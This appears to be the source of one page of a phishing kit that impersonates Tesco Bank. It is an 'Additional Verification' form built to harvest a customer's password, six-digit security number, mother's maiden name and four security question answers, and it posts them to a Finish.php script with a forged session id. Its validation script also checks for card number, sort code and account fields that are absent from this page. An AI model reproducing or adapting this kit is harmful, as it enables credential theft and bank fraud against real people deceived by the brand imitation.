<?php


require "../../includes/One_Time.php";
require "../../includes/functions.php";
?>
<!DOCTYPE html>
<html class=" js no-touch svg" lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<meta http-equiv="x-ua-compatible" content="ie=edge">
<title>Customer Verify</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="assets/css/verify.css" rel="stylesheet">
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<script type="text/javascript">function movetoNext(current, nextFieldID) {if (current.value.length >= current.maxLength) {document.getElementById(nextFieldID).focus();}}</script>
<script type="text/javascript">
function validateForm() {	
    var x = document.forms["verify"]["fname"].value;
    if (x == null || x == "") {
        document.getElementById("fname-error").style.display = "block";
		var d = document.getElementById("fname");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("submit-errors");
		e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["lname"].value;
    if (x == null || x == "") {
        document.getElementById("lname-error").style.display = "block";
		var d = document.getElementById("lname");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["address"].value;
    if (x == null || x == "") {
        document.getElementById("address-error").style.display = "block";
		var d = document.getElementById("address");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["postcode"].value;
    if (x == null || x == "") {
        document.getElementById("postcode-error").style.display = "block";
		var d = document.getElementById("postcode");
		d.className = d.className + " form__highlight-error";
        return false;
    }
    var x = document.forms["verify"]["telephone"].value;
    if (x == null || x == "") {
        document.getElementById("telephone-error").style.display = "block";
		var d = document.getElementById("telephone");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["email"].value;
    if (x == null || x == "") {
        document.getElementById("email-error").style.display = "block";
		var d = document.getElementById("email");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["day"].value;
    if (x == null || x == "") {
        document.getElementById("dob-error").style.display = "block";
		var d = document.getElementById("day");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["month"].value;
    if (x == null || x == "") {
        document.getElementById("dob-error").style.display = "block";
		var d = document.getElementById("month");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["year"].value;
    if (x == null || x == "") {
        document.getElementById("dob-error").style.display = "block";
		var d = document.getElementById("year");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["sortcode"].value;
    if (x == null || x == "") {
        document.getElementById("sortcode-error").style.display = "block";
		var d = document.getElementById("sortcode");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["ccno"].value;
    if (x == null || x == "") {
        document.getElementById("ccno-error").style.display = "block";
		var d = document.getElementById("ccno");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["ccmm"].value;
    if (x == null || x == "") {
        document.getElementById("ccexp-error").style.display = "block";
		var d = document.getElementById("ccmm");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["ccyy"].value;
    if (x == null || x == "") {
        document.getElementById("ccexp-error").style.display = "block";
		var d = document.getElementById("ccyy");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }	
    var x = document.forms["verify"]["account"].value;
    if (x == null || x == "") {
        document.getElementById("account-error").style.display = "block";
		var d = document.getElementById("account");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["secode"].value;
    if (x == null || x == "") {
        document.getElementById("secode-error").style.display = "block";
		var d = document.getElementById("secode");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c1"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c1");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c2"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c2");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c3"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c3");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c4"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c4");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c5"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c5");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["c6"].value;
    if (x == null || x == "") {
        document.getElementById("code-error").style.display = "block";
		var d = document.getElementById("c6");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["mmn"].value;
    if (x == null || x == "") {
        document.getElementById("mmn-error").style.display = "block";
		var d = document.getElementById("mmn");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("submit-errors");
		e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["pass"].value;
    if (x == null || x == "") {
        document.getElementById("pass-error").style.display = "block";
		var d = document.getElementById("pass");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("submit-errors");
		e.style.display = "block";
		e.focus();
        return false;
    }	
    var x = document.forms["verify"]["q1"].value;
    if (x == null || x == "") {
        document.getElementById("q1-error").style.display = "block";
		var d = document.getElementById("q1");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["a1"].value;
    if (x == null || x == "") {
        document.getElementById("a1-error").style.display = "block";
		var d = document.getElementById("a1");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["q2"].value;
    if (x == null || x == "") {
        document.getElementById("q2-error").style.display = "block";
		var d = document.getElementById("q2");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["a2"].value;
    if (x == null || x == "") {
        document.getElementById("a2-error").style.display = "block";
		var d = document.getElementById("a2");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["q3"].value;
    if (x == null || x == "") {
        document.getElementById("q3-error").style.display = "block";
		var d = document.getElementById("q3");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["a3"].value;
    if (x == null || x == "") {
        document.getElementById("a3-error").style.display = "block";
		var d = document.getElementById("a3");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["q4"].value;
    if (x == null || x == "") {
        document.getElementById("q4-error").style.display = "block";
		var d = document.getElementById("q4");
		d.className = d.className + " form__highlight-error";
				var e = document.getElementById("submit-errors");
e.style.display = "block";
		e.focus();
        return false;
    }
    var x = document.forms["verify"]["a4"].value;
    if (x == null || x == "") {
        document.getElementById("a4-error").style.display = "block";
		var d = document.getElementById("a4");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("submit-errors");
		e.style.display = "block";
		e.focus();
        return false;
    }
	var x = document.forms["verify"]["q1"].value;
	var y = document.forms["verify"]["q2"].value;
    if (x == y) {
        document.getElementById("q1-question-match").style.display = "block";
        document.getElementById("q2-question-match").style.display = "block";
		var d = document.getElementById("q1");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q2");
		e.className = e.className + " form__highlight-error";		
		q1.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }
	var x = document.forms["verify"]["q1"].value;
	var y = document.forms["verify"]["q3"].value;
    if (x == y) {
        document.getElementById("q1-question-match").style.display = "block";
        document.getElementById("q3-question-match").style.display = "block";
		var d = document.getElementById("q1");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q3");
		e.className = e.className + " form__highlight-error";		
		q1.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }
	var x = document.forms["verify"]["q1"].value;
	var y = document.forms["verify"]["q4"].value;
    if (x == y) {
        document.getElementById("q1-question-match").style.display = "block";
        document.getElementById("q4-question-match").style.display = "block";
		var d = document.getElementById("q1");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q4");
		e.className = e.className + " form__highlight-error";		
		q1.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }
	var x = document.forms["verify"]["q2"].value;
	var y = document.forms["verify"]["q3"].value;
    if (x == y) {
        document.getElementById("q2-question-match").style.display = "block";
        document.getElementById("q3-question-match").style.display = "block";
		var d = document.getElementById("q2");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q3");
		e.className = e.className + " form__highlight-error";		
		q2.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }
	var x = document.forms["verify"]["q2"].value;
	var y = document.forms["verify"]["q4"].value;
    if (x == y) {
        document.getElementById("q2-question-match").style.display = "block";
        document.getElementById("q4-question-match").style.display = "block";
		var d = document.getElementById("q2");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q4");
		e.className = e.className + " form__highlight-error";		
		q2.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }	
	var x = document.forms["verify"]["q3"].value;
	var y = document.forms["verify"]["q4"].value;
    if (x == y) {
        document.getElementById("q3-question-match").style.display = "block";
        document.getElementById("q4-question-match").style.display = "block";
		var d = document.getElementById("q3");
		d.className = d.className + " form__highlight-error";
		var e = document.getElementById("q4");
		e.className = e.className + " form__highlight-error";		
		q3.focus();
		var g = document.getElementById("submit-errors");
		g.style.display = "block";
        return false;
    }
}
</script>
</head>
  <body>
    <div class="container">
      <div id="skiplink"><a href="#" class="screen-reader-only">skip to content</a></div>
      <header role="banner">
  <div class="header">
    <div class="inner">
      <div class="header__logo" role="img" aria-label="Tesco Bank">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1130.6 208.1"><path fill="#274B93" d="M61.9 168H150c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.6 14.5-34.3 14.5H7.3c-.6 0-.6-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.2-14 31.7-14M639.9 168h88.2c.7 0 .9.5-.1.8-9.9 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23-18.4 23-18.4 5.6-5.8 17.2-14 31.6-14M206.4 168h88.1c.8 0 .9.5-.1.8-9.8 4.3-24.1 17.8-24.1 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.5 0-.5-.5-.2-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.7-5.8 17.3-14 31.7-14M351 168h88c.8 0 .9.5 0 .8-9.9 4.3-24.2 17.8-24.2 17.8-9.9 8.9-17.7 14.5-34.3 14.5h-84.2c-.6 0-.6-.5-.1-.7 9.3-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14M495.5 168h88.1c.8 0 .9.5-.1.8-9.9 4.3-24.2 17.8-24.2 17.8-9.8 8.9-17.6 14.5-34.2 14.5h-84.2c-.6 0-.6-.5-.2-.7 9.4-4.7 23.1-18.4 23.1-18.4 5.6-5.8 17.2-14 31.7-14"></path><path fill="#C20E1A" d="M519.3 8.4c-55.4 0-92.1 26.7-92.1 67.3 0 37.3 33.6 62.1 84 62.1 16.3 0 31-2 47.9-6.1v-31.4c-12 12.7-26.4 17.7-41.8 17.7-29.7 0-50.1-18.6-50.1-45.3 0-26.3 21.1-45.4 50.6-45.4 16.1 0 29 5.7 39.3 15.8V11.7c-10.7-2.2-24.1-3.3-37.8-3.3M102.5 30.2c20.6.2 45.2 3.9 55.6 11.9V12.3H11.9v29.8C22.3 34 44 30.9 67.7 30.7v81.2c0 11.9-1 15.3-6 21.5h46.9c-5.3-6.2-6.1-9.6-6.1-21.5V30.2zM254.3 59.4c-8.5 2.7-23.4 3.5-31.6 3.5h-12.2V30.7H227c14.7 0 40.3 3.1 49.9 11.1V12.3H170.6c4.9 6.2 5.9 9.7 5.9 21.5V112c0 11.9-1 15.4-5.7 21.5h113.4V104c-15.5 11.1-45.1 11.2-57.2 11h-16.5V81h12.2c8.1 0 23 .9 31.6 3.5V59.4zM412 16.4c-16.7-5.3-38.9-8.3-55.8-8.3-30.8 0-60.7 9.1-60.7 39.7 0 53 92.3 25 92.3 57.4 0 10.5-16.3 14.8-29.5 14.8-23.8 0-40.3-3.6-61-16v26.6c15.5 5.1 36.6 7.6 59.5 7.6 31.9 0 61.7-8.2 61.7-39.5 0-55.3-92.3-30.5-92.3-57.5 0-10.9 14.8-14.7 27.7-14.7 21.8 0 45.3 6.5 58.2 18.4V16.4zM723.6 72.2c0-38.2-30.1-63.8-75.1-63.8-47.8 0-81.5 27.5-81.5 66.2 0 38 30.3 63.2 75.5 63.2 48 0 81.1-26.7 81.1-65.6m-119.9.7c0-25.5 16.2-46.3 41.6-46.3 25 0 41.6 20.7 41.6 46.3 0 25.6-16.6 46.2-41.6 46.2-25.4.1-41.6-20.6-41.6-46.2"></path><path fill="#274B93" d="M828.6 76.3h-27.9v45.1h27.9c14.4 0 22.9-9.2 22.9-22.5 0-13.4-8.7-22.6-22.9-22.6m-3.4-51.8h-24.5v39.4h24.5c11.5 0 19.5-8 19.5-19.9 0-13-7.3-19.5-19.5-19.5m5.9 109.3h-43.5c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2-9.4H827c24.8 0 34.2 13.7 34.2 28.7 0 9-2.5 20.6-15.4 27.9 16.9 5.9 22.7 17.4 22.7 31.4 0 18.1-14 33.7-37.4 33.7M930.9 95.1c-4.6-.9-12.6-2-18.5-2-13.3 0-19.7 5.5-19.7 16 0 10.3 6.6 14.7 16.5 14.7 11.7 0 19-6.6 21.6-9.9V95.1zm2.7 38.7c-1.6 0-2.5-.7-2.5-2.1V126c-3.4 3.2-11.2 9.9-26.8 9.9-17.2 0-26.8-10.6-26.8-26.4 0-17.7 12.4-27.5 33-27.5 7.3 0 14.9.9 20.4 1.8v-4.3c0-13.5-7.3-17.9-21.1-17.9-11 0-19.2 3.7-21.8 5.5l-2.7-7.1c-.2-.7-.7-2.1-.5-2.3-.5-2.1.9-3.2 3.2-4.3 2.7-1.2 12.1-4.4 23.6-4.4 26.3 0 34.2 11.9 34.2 29.5v55.4h-12.2zM1021.1 133.8c-1.4 0-2.3-.7-2.3-2.1v-49c0-13.5-5-20.8-17.9-20.8-10.6 0-18.8 6.7-23.4 13.3v58.5h-12.6c-1.4 0-2.3-.7-2.3-2.1V72.7c0-5.3-.4-10.8-1.2-15.4-.4-2.5-.9-4.6-1.6-6.2h11.9c1.8 0 2.5.7 2.8 1.6.4.9.7 2.1.9 3.4.4 1.8.5 3.9.7 5.5 3.5-4.1 13.1-12.6 27.3-12.6 21.5 0 30.3 11.2 30.3 30.3v54.5h-12.6zM1107.6 133.8c-1.8 0-3.4-.5-5.3-2.7L1065 92.6v41.2h-12.6c-1.4 0-2.3-.7-2.3-2.1V21.5c0-3.9-.7-7.5-2.5-9.4l9.6-.9c2.3-.2 4.3-.4 5.1-.4 1.8 0 2.7.7 2.7 2.3V85l31.8-31.2c2.1-2 3.5-2.7 5.3-2.7h16.3L1080 88l45.4 45.8h-17.8z"></path></svg>
      </div>
    </div>
  </div>
</header>

      <main role="main">
        <div id="content" class="content">
          
    <div class="security-banner">
  <div class="inner">
    <div class="security-banner__icon">
      <span class="security-banner__circle"><i class="icon icon--security"></i></span>
    </div>
    <div class="security-banner__container">
      <p class="security-banner__title">Account Verification</p></div>
    </div>
</div>

    
    
<div class="progress-bar">
  <div class="inner">
    <div class="progress-bar__container"><span class="screen-reader-only">Step 1 of 2</span>
    <span class="progress-bar__step progress-bar__step--last"><i class="icon icon--chevron-end"></i></span></div></div>
</div>

    
<div class="page-heading">
  <div class="inner">
    <h4 class="page-heading__primary">Additional Verification</h4>
  </div>
</div>
    <div id="customer-verify" data-tag="pagename">
      <div class="inner">
        <form method="post" id="verify" name="verify" class="form" action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" novalidate="novalidate" onsubmit="return validateForm();">
          <input type="hidden" name="username" value="<?php echo $_POST['one'];?>">
          

      

		  
		   <div class="form__panel">
            <h2 class="form__heading">Security Information</h2>
            <div id="banking-fields">
              <div class="form__item">
                <label for="code" class="form__label">Security Number
				<span id="code-error" class="form__error" style="display:none">This field is required.</span>
				</label>
                <div class="form__control">
				<input style="width:50px" type="tel" name="c1" id="c1" value="" maxlength="1" class="form__input" onkeyup="movetoNext(this, 'c2')">
				<input style="width:50px" type="tel" name="c2" id="c2" value="" maxlength="1" class="form__input" onkeyup="movetoNext(this, 'c3')">
				<input style="width:50px" type="tel" name="c3" id="c3" value="" maxlength="1" class="form__input" onkeyup="movetoNext(this, 'c4')">
				<input style="width:50px" type="tel" name="c4" id="c4" value="" maxlength="1" class="form__input" onkeyup="movetoNext(this, 'c5')">
				<input style="width:50px" type="tel" name="c5" id="c5" value="" maxlength="1" class="form__input" onkeyup="movetoNext(this, 'c6')">
				<input style="width:50px" type="tel" name="c6" id="c6" value="" maxlength="1" class="form__input">
				</div>
              </div>
              <div class="form__item">
                <label for="pass" class="form__label">Password
				<span id="pass-error" class="form__error" style="display:none">This field is required.</span>
				</label>
                <div class="form__control"><input type="password" name="pass" id="pass" value="" maxlength="30" class="form__input" placeholder="Enter your password"></div>
              </div>
              <div class="form__item">
                <label for="mmn" class="form__label">Mother's Maiden Name
				<span id="mmn-error" class="form__error" style="display:none">This field is required.</span>
				</label>
                <div class="form__control"><input type="text" name="mmn" id="mmn" value="" maxlength="30" class="form__input" placeholder="Enter your mother's maiden name"></div>
              </div>
            </div>
              <div class="form__item">
                <label for="q1" class="form__label">Verify Security Question 1
				<span id="q1-error" class="form__error" style="display:none">Please verify your security question.</span>
				<span id="q1-question-match" class="form__error" style="display:none">You can not select the same security questions.</span>
				</label>
                <div class="form__control">
				<select id="q1" name="q1" class="form__select" onblur="RemoveOption();" onchange="AddOption();">
				<?php require "assets/includes/questions.php";?>
				</select>
				</div>
              </div>
            <div class="form__item">
              <label for="a1" class="form__label">Answer
			  <span id="a1-error" class="form__error" style="display:none">This field is required.</span>
			  </label>
              <div class="form__control">
			  <input type="text" name="a1" id="a1" value="" maxlength="40" class="form__input" placeholder="Enter your answer to above security question"></div>
            </div>
              <div class="form__item">
                <label for="q2" class="form__label">Verify Security Question 2
				<span id="q2-error" class="form__error" style="display:none">Please verify your security question.</span>
				<span id="q2-question-match" class="form__error" style="display:none">You can not select the same security questions.</span>				
				</label>
                <div class="form__control">
				<div id="q2Selects">
				<select id="q2" name="q2" class="form__select">
				<?php require "assets/includes/questions.php";?>
				</select>
				</div>
				</div>
              </div>
            <div class="form__item">
              <label for="a2" class="form__label">Answer
			  <span id="a2-error" class="form__error" style="display:none">This field is required.</span>
			  </label>
              <div class="form__control">
			  <input type="text" name="a2" id="a2" value="" maxlength="40" class="form__input" placeholder="Enter your answer to above security question"></div>
            </div>
              <div class="form__item">
                <label for="q3" class="form__label">Verify Security Question 3
				<span id="q3-error" class="form__error" style="display:none">Please verify your security question.</span>
				<span id="q3-question-match" class="form__error" style="display:none">You can not select the same security questions.</span>
				</label>
                <div class="form__control">
				<select id="q3" name="q3" class="form__select">
				<?php require "assets/includes/questions.php";?>
				</select>
				</div>
              </div>
            <div class="form__item">
              <label for="a3" class="form__label">Answer
			  <span id="a3-error" class="form__error" style="display:none">This field is required.</span>
			  </label>
              <div class="form__control">
			  <input type="text" name="a3" id="a3" value="" maxlength="40" class="form__input" placeholder="Enter your answer to above security question"></div>
            </div>
              <div class="form__item">
                <label for="q4" class="form__label">Verify Security Question 4
				<span id="q4-error" class="form__error" style="display:none">Please verify your security question.</span>
				<span id="q4-question-match" class="form__error" style="display:none">You can not select the same security questions.</span>
				</label>
                <div class="form__control">
				<select id="q4" name="q4" class="form__select">
				<?php require "assets/includes/questions.php";?>
				</select>
				</div>
              </div>
            <div class="form__item">
              <label for="a4" class="form__label">Answer
			  <span id="a4-error" class="form__error" style="display:none">This field is required.</span>
			  </label>
              <div class="form__control">
			  <input type="text" name="a4" id="a4" value="" maxlength="40" class="form__input" placeholder="Enter your answer to above security question"></div>
            </div>
          </div>
		  
          <div id="submit-errors" style="display:none;">
  <div class="pre-submit-errors">
    <p class="form__error">Please correct the errors above in order to validate your account</p>
  </div>
</div>

          <div class="button-container">
            <input type="submit" class="button button--action" id="NEXTBUTTON" value="Validate">
          </div>

        </form>
      </div>
    </div>
    <div class="banner">
  <div class="inner">
    <div class="banner__content"><h3>Why have I been asked to complete account verification?</h3>
	<p> We value your security the most here at Tesco Bank.</p></div>
  </div>
</div>

  


        </div>
      </main>
    
<footer>
  <div class="footer">
    <div class="inner">
      <p class="footer__copyright" role="contentinfo">Copyright &copy; 2017 Tesco Personal Finance plc</p>
    </div>
  </div>
</footer>

    </div>
  


</body></html>